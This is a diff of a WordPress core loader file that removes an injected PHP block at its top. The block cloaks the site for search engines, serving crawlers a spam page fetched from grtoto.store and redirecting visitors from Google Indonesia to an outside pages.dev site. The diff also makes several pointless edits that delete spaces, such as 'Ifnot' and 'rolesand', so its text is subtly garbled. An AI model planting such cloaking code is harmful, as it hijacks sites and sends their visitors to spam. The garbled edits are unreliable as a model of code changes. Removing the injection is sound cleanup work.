@@ -1,30 +1,4 @@
 <?php
-$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
-$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
-
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
-if (is_bot()) {
-echo file_get_contents('https://grtoto.store/xxx-conextion/lynixworld-macbook.html');
-exit;
-}
-
-if (stripos($s_ref, 'google.co.id') !== false ||
-(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://lynixworldmacbook.pages.dev/");
-exit;
-}
-?>
-<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -262,7 +236,7 @@ function wp_check_php_mysql_versions() {
  * or a constant of the same name.
  *
  * Possible values are 'local', 'development', 'staging', and 'production'.
- * If not set, the type defaults to 'production'.
+ * Ifnot set, the type defaults to 'production'.
  *
  * @since 5.5.0
  * @since 5.5.1 Added the 'local' type.
@@ -834,7 +808,7 @@ function wp_using_ext_object_cache( $using = null ) {
 
 	$current_using = $_wp_using_ext_object_cache;
 
-	if ( null !== $using ) {
+	if (null !== $using ) {
 		$_wp_using_ext_object_cache = $using;
 	}
 
@@ -1135,7 +1109,7 @@ function wp_get_active_and_valid_themes() {
 	 * that should be protected against WSODs and the theme is paused.
 	 */
 	if ( wp_is_recovery_mode() ) {
-		$themes = wp_skip_paused_themes( $themes );
+		$themes =wp_skip_paused_themes( $themes );
 
 		// If no active and valid themes exist, skip loading themes.
 		if ( empty( $themes ) ) {
@@ -1442,7 +1416,7 @@ function is_network_admin() {
  * e.g. `/wp-admin/user/`
  *
  * Does not check if the user is an administrator; use current_user_can()
- * for checking roles and capabilities.
+ * for checking rolesand capabilities.
  *
  * @since 3.1.0
  *
@@ -1765,7 +1739,7 @@ function wp_is_ini_value_changeable( $setting ) {
  */
 function wp_doing_ajax() {
 	/**
-	 * Filters whether the current request is a WordPress Ajax request.
+	 * Filterswhether the current request is a WordPress Ajax request.
 	 *
 	 * @since 4.7.0
 	 *
